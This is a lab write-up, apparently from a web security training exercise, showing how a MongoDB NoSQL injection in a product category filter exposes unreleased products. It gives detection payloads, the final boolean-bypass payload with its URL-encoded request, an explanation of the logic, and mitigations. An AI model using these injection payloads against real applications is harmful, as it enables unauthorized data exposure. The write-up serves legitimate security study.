# NoSQL Injection – Display Unreleased Products

## 📌 Lab Objective

Exploit a NoSQL injection vulnerability in the product category filter to display unreleased products.

---

## 🧠 Vulnerability Overview

The application uses a MongoDB database to filter products by category.

The backend likely constructs a query similar to:

db.products.find({
  category: '<USER_INPUT>',
  released: true
})

User input is inserted directly into a JavaScript context without proper sanitization.

This allows JavaScript expression injection.

---

## 🔎 Injection Detection

### Step 1 – Syntax Error Test

Payload:
'

Result:
A JavaScript syntax error occurred, indicating unsanitized input in a JS context.

---

### Step 2 – Boolean Condition Testing

False condition:

Gifts' && 0 && 'x

Result:
No products returned.

True condition:

Gifts' && 1 && 'x

Result:
Products in the "Gifts" category were returned.

This confirms boolean-based NoSQL injection.

---

## 🚀 Exploitation

Final payload:

Gifts'||1||'

URL-encoded version:

Gifts%27%7C%7C1%7C%7C%27

Request:

GET /filter?category=Gifts%27%7C%7C1%7C%7C%27 HTTP/1.1

Result:
All products were returned, including unreleased products.

Lab marked as solved.

---

## 🧠 Why This Works

The injected payload modifies the query logic:

Original intent:
category = 'Gifts' AND released = true

Injected logic:
category = 'Gifts' || 1

Since 1 evaluates to true, the query condition always evaluates to true.

This bypasses the release filter.

---

## 🎯 Impact in Real-World Applications

If exploited in a real application, this vulnerability could lead to:

- Access to hidden or unreleased products
- Authentication bypass
- Data exposure
- Privilege escalation
- Full database enumeration

---

## 🔐 Mitigation

- Use parameterized queries
- Avoid constructing queries using string concatenation
- Validate and sanitize user input
- Disable server-side JavaScript execution where unnecessary
- Implement strict input validation

---

## 📚 Key Takeaways

- NoSQL injection can occur in JavaScript contexts
- Boolean-based logic manipulation is powerful
- Always test for both true and false conditions
- URL encoding is critical when injecting special characters

---
